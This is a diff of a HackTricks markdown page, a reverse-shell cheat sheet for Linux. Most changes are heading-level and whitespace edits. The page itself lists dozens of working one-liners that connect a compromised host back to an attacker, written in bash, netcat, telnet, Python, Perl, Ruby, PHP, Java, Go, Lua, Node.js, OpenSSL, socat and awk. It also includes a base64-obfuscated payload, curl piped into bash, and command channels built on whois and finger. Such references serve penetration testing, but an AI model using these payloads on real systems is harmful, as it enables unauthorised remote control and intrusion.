@@ -1,4 +1,4 @@
-
+# Shells - Linux
 
 <details>
 
@@ -16,17 +16,16 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
-
 **If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com)
 
-# Full TTY
+## Full TTY
 
 **Once you get a reverse shell**[ **read this page to obtain a full TTY**](full-ttys.md)**.**
 
-# Bash | sh
+## Bash | sh
 
 ```bash
-curl http://reverse-shell.sh/1.1.1.1:3000 | bash
+curl https://reverse-shell.sh/1.1.1.1:3000 | bash
 bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
 sh -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
 0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
@@ -39,7 +38,7 @@ exec >&0
 
 Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
 
-## Symbol safe shell
+### Symbol safe shell
 
 ```bash
 #If you need a more stable connection do:
@@ -50,14 +49,14 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
 
-## Create in file and execute
+### Create in file and execute
 
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 
-# Forward Shell
+## Forward Shell
 
 You might find cases where you have a **RCE in a web app in a, Linux machine** but due to Iptables rules or other kind of filtering **you cannot get a reverse shell**. This "shell" allows you to maintain a PTY shell through that RCE using pipes inside the victim system.\
 You can find the code in [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
@@ -70,7 +69,7 @@ You just need to modify:
 
 Then, you can just **send commands** or even **use the `upgrade` command** to get a full PTY (note that pipes are read and written with an approximate 1.3s delay).
 
-# Netcat
+## Netcat
 
 ```bash
 nc -e /bin/sh <ATTACKER-IP> <PORT>
@@ -80,7 +79,7 @@ nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
 
-# Telnet
+## Telnet
 
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
@@ -89,7 +88,7 @@ telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
 
-# Whois
+## Whois
 
 **Attacker**
 
@@ -105,7 +104,7 @@ To send the command write it down, press enter and press CTRL+D (to stop STDIN)
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
 
-# Python
+## Python
 
 ```bash
 #Linux
@@ -115,28 +114,28 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
 ```
 
-# Perl
+## Perl
 
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 
-# Ruby
+## Ruby
 
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
-# PHP
+## PHP
 
 ```bash
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
 
-# Java
+## Java
 
 ```bash
 r = Runtime.getRuntime()
@@ -144,20 +143,20 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while r
 p.waitFor()
 ```
 
-# Ncat
+## Ncat
 
 ```bash
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 
-# Golang
+## Golang
 
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 
-# Lua
+## Lua
 
 ```bash
 #Linux
@@ -166,7 +165,7 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','123
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
 
-# NodeJS
+## NodeJS
 
 ```javascript
 (function(){
@@ -198,7 +197,7 @@ or
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 
-# OpenSSH
+## OpenSSH
 
 Attacker (Kali)
 
@@ -218,31 +217,31 @@ openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_clien
 openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
 ```
 
-# **Socat**
+## **Socat**
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-## Bind shell
+### Bind shell
 
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337 
 ```
 
-## Reverse shell
+### Reverse shell
 
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 
-# Awk
+## Awk
 
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
 
-# Finger
+## Finger
 
 **Attacker**
 
@@ -260,7 +259,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; s
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
 ```
 
-# Gawk
+## Gawk
 
 ```bash
 #!/usr/bin/gawk -f
@@ -285,15 +284,15 @@ BEGIN {
 }
 ```
 
-# Xterm
+## Xterm
 
-One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
+One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
 
 ```bash
 xterm -display 10.0.0.1:1
 ```
 
-To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):
 
 ```bash
 Xnest :1
@@ -305,7 +304,7 @@ You’ll need to authorise the target to connect to you (command also run on you
 xhost +targetip
 ```
 
-# Groovy
+## Groovy
 
 by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Java reverse shell also work for Groovy
 
@@ -316,7 +315,7 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-# Bibliography
+## Bibliography
 
 {% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}
 
@@ -325,8 +324,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 {% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
-
-
 
 <details>
 
@@ -343,5 +340,3 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
